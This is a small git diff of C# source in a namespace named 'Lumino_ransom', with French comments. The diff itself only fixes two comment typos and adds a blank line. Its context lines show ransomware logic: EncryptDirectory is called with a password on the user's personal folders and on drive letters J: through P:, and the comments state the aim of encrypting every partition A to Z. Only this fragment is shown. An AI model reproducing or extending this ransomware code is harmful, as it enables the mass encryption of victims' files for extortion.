@@ -280,7 +280,7 @@ namespace Lumino_ransom
 
                 EncryptDirectory(startPath, password);                                     // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath" ---|
                 EncryptDirectory(startPath2, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath2"   |
-                EncryptDirectory(startPath3, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath3"   |---| Encyption de chaque répertoire 'Personnel' de l'utilisateur
+                EncryptDirectory(startPath3, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath3"   |---| Encryption de chaque répertoire 'Personnel' de l'utilisateur
                 EncryptDirectory(startPath4, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath4"   |---|          qui contient des fichiers 'importants'
                 EncryptDirectory(startPath5, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath5"   |
                 EncryptDirectory(startPath6, password);                                    // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "startPath6"---|
@@ -297,7 +297,7 @@ namespace Lumino_ransom
                 EncryptDirectory("J:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "J:\\"         |
                 EncryptDirectory("K:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "K:\\"         |
                 EncryptDirectory("L:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "L:\\"         |
-                EncryptDirectory("M:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "M:\\"         |---| Encyption de toutes les partitions de l'ordinateur qui ont une lettre de A à Z et partitionnées par Windows
+                EncryptDirectory("M:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "M:\\"         |---| Encryption de toutes les partitions de l'ordinateur qui ont une lettre de A à Z et partitionnées par Windows
                 EncryptDirectory("N:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "N:\\"         |---|                 (Linux: /dev/sda1 --> ✖ | Mac: /dev/disk0s1 --> ✖ | C:\Windows\ --> ✔)
                 EncryptDirectory("O:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "O:\\"         |
                 EncryptDirectory("P:\\", password);                                        // Appel de la fonction "EncryptDirectory" qui va encypter chaque fichiers avec le mot de passe (password) qui ont bonne extention dans le chemin du répertoire "P:\\"         |
@@ -805,5 +805,6 @@ namespace Lumino_ransom
     //public partial class
 
 }
+
 
 //namespace
